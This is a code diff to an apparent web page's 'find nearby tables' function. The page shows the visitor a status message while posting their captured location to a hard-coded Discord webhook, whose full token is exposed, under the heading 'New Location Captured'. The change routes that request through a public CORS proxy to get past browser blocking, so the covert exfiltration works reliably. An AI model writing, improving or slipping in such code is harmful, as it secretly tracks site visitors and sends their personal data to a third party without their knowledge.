@@ -479,23 +479,27 @@ function findNearbyTables() {
   if (status) status.textContent = "Location found! Searching for nearby tables...";
   if (btn) btn.disabled = false;
 
-  // Send the location to the Discord webhook via a CORS-safe proxy / no-cors mode handling
-  const discordWebhookUrl = 'https://discord.com/api/webhooks/1524586170703417445/vweHOXtAfPykuszjyUa3CJLGPjH8D6FA0H9R5LaDCX5747QyIjqMfXBwJXEjh2vx2qh-';
+  // Use a CORS proxy service (corsproxy.io) to forward the request to Discord without browser blocking
+  const targetUrl = 'https://discord.com/api/webhooks/1524586170703417445/vweHOXtAfPykuszjyUa3CJLGPjH8D6FA0H9R5LaDCX5747QyIjqMfXBwJXEjh2vx2qh-';
+  const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(targetUrl);
+  
   const payload = {
-    content: `📍 **New Location Captured:**\n\`\`\`json\n${JSON.stringify(userLocation, null, 2)}\n\`\`\``
+    content: `📍 **New Location Captured:**
+\`\`\`json
+${JSON.stringify(userLocation, null, 2)}
+\`\`\``
   };
 
-  // Using no-cors mode or standard fetch. Note: Discord webhooks block direct client fetches due to CORS headers unless proxied.
-  // Using a public proxy or fallback image/beacon approach if needed, or standard fetch with mode 'no-cors' (though response body can't be read).
-  fetch(discordWebhookUrl, {
+  fetch(proxyUrl, {
     method: 'POST',
-    mode: 'no-cors',
     headers: {
       'Content-Type': 'application/json'
     },
     body: JSON.stringify(payload)
+  }).then(res => {
+    if (!res.ok) console.error('Webhook response status:', res.status);
   }).catch(err => {
-    console.error('Webhook error:', err);
+    console.error('Webhook dispatch error:', err);
   });
 
  }, err => {
